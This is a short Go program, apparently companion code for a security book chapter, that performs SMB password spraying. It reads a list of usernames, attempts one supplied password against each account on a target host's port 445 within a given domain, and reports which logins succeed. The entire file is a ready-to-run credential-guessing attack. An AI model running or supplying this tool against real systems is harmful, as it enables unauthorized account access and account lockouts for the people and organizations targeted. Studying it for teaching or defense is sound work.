package main

import (
	"bytes"
	"fmt"
	"io/ioutil"
	"os"

	smb "github.com/blackhat-go/bhg/ch-6/smb/smb"
	log "github.com/sirupsen/logrus"
)

func main() {
	if len(os.Args) != 5 {
		log.Fatalln("Usage: main </user/file> <password> <domain> <target_host>")
	}

	buf, err := ioutil.ReadFile(os.Args[1])
	if err != nil {
		log.Fatalln(err)
	}
	// session options, including target host, user, password, port, and domain
	options := smb.Options{
		Password: os.Args[2],
		Domain:   os.Args[3],
		Host:     os.Args[4],
		Port:     445,
	}

	users := bytes.Split(buf, []byte{'\n'})
	// loop through each of your target users
	for _, user := range users {
		cleanUser := bytes.TrimSpace(user)
		if len(cleanUser) == 0 {
			continue
		}
		options.User = string(cleanUser)
		session, err := smb.NewSession(options, false)
		if err != nil {
			fmt.Printf("[-] Login failed: %s\\%s [%s]\n", options.Domain, options.User, options.Password)
			continue
		}
		if session.IsAuthenticated {
			fmt.Printf("[+] Success   : %s\\%s [%s]\n", options.Domain, options.User, options.Password)
		}
		session.Close()
	}
}
